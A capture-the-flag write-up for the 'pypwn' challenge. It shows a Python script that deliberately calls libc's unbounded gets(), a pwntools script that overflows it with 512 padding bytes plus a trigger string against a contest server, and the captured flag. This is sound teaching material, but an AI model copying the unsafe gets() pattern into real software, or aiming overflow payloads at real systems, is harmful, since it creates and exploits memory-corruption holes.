# pypwn Writeup

**Challenge Name:** pypwn
**Category:** PWN
**Points:** 30


![](attachments/Pasted%20image%2020251130122418.png)


## Challenge
```
#!/usr/bin/env python3

from ctypes import CDLL, c_buffer, c_char
import sys, os

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

# Primary vulnerable buffer
buf = c_buffer(1024)

# Secondary buffer to create misdirection
shadow_buf = (c_char * 256)()

# Fake canary (completely useless but psychologically effective)
FAKE_CANARY = b"\xDE\xAD\xBE\xEF"

# Secret trigger (reversed for obfuscation)
TRIGGER = b"NOVA_CTF"[::-1]

print("=== Python Native Interface Memory Challenge ===")
print("Inbound payload stream initialized.")
print("Provide input sequence: ")
sys.stdout.flush()

# Intentional unsafe call
libc.gets(buf)

# Copy some of the overflow candidate area into a shadow buffer
for i in range(256):
    shadow_buf[i] = buf[512 + i]

# Output partial shadow to avoid trivial brute-force
print(f"[Diagnostics] Shadow segment preview: {bytes(shadow_buf[:12])}")

# Multi-stage validation
overflow_hit = TRIGGER in bytes(shadow_buf)
canary_hit = FAKE_CANARY in bytes(buf)

if overflow_hit:
    print("[+] Memory boundary violation acknowledged.")
    print("[+] Secondary trigger sequence validated.")
elif canary_hit:
    print("[!] Canary breach detected… but this is a decoy.")
    print("    Nice try, engineer.")
    sys.exit(1)
else:
    print("[-] No unauthorized memory behavior observed.")
    sys.exit(1)

# Final stage: file retrieval
flag_path = "/home/chal/flag.txt"
if os.path.exists(flag_path):
    print(open(flag_path).read())
else:
    print("Flag asset missing. Contact challenge admin.")
```


## Analysis

The provided script `pypwn.py` uses the `ctypes` library to interface with the C standard library (`libc`).

```python
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
# ...
buf = c_buffer(1024)
# ...
libc.gets(buf)
```

The script allocates a 1024-byte buffer `buf` and then calls `libc.gets(buf)`. The `gets` function is notoriously unsafe because it does not perform bounds checking, allowing for a buffer overflow. However, in this specific challenge, we don't need to overwrite a return address or control instruction pointer (RIP), but rather satisfy a logic check within the Python script.

The script has a "shadow buffer" mechanism:

```python
# Secondary buffer to create misdirection
shadow_buf = (c_char * 256)()

# ...

# Copy some of the overflow candidate area into a shadow buffer
for i in range(256):
    shadow_buf[i] = buf[512 + i]
```

It copies 256 bytes starting from offset 512 of `buf` into `shadow_buf`.

The win condition is defined as:

```python
# Secret trigger (reversed for obfuscation)
TRIGGER = b"NOVA_CTF"[::-1]  # This evaluates to b"FTC_AVON"

# ...

overflow_hit = TRIGGER in bytes(shadow_buf)

if overflow_hit:
    # ... prints flag ...
```

To get the flag, we need the string `FTC_AVON` to appear in `shadow_buf`. Since `shadow_buf` is populated from `buf[512:]`, we need to fill the first 512 bytes of `buf` with padding and then place our trigger string.

## Solution

We can construct a payload consisting of 512 bytes of padding (e.g., 'A's) followed by the trigger string `FTC_AVON`.

**Payload Structure:**
`[ 512 bytes padding ] + [ "FTC_AVON" ]`

### Exploit Script

```python
from pwn import *

host = '38.60.200.116'
port = 9000

try:
    r = remote(host, port)

    # TRIGGER = b"NOVA_CTF"[::-1] -> b"FTC_AVON"
    trigger = b"FTC_AVON"

    # We need to fill 512 bytes, then place the trigger.
    # The code copies buf[512]...buf[767] into shadow_buf.
    payload = b"A" * 512 + trigger

    print(r.recvuntil(b"Provide input sequence: \n").decode())
    r.sendline(payload)

    # Read the rest of the output which should contain the flag
    print(r.recvall().decode())

except Exception as e:
    print(f"Error: {e}")
```


## The Result

```
python3 get_flag.py 
[+] Opening connection to 38.60.200.116 on port 9000: Done
=== Python Native Interface Memory Challenge ===
Inbound payload stream initialized.
Provide input sequence: 

[+] Receiving all data: Done (198B)
[*] Closed connection to 38.60.200.116 port 9000
[Diagnostics] Shadow segment preview: b'FTC_AVON\x00\x00\x00\x00'
[+] Memory boundary violation acknowledged.
[+] Secondary trigger sequence validated.
NOVA_CTF{pyth0n_c4n_pwn_w1th_buff3r_0v3rfl0w}
```

## Flag

`NOVA_CTF{pyth0n_c4n_pwn_w1th_buff3r_0v3rfl0w}`


![](attachments/Pasted%20image%2020251130123618.png)
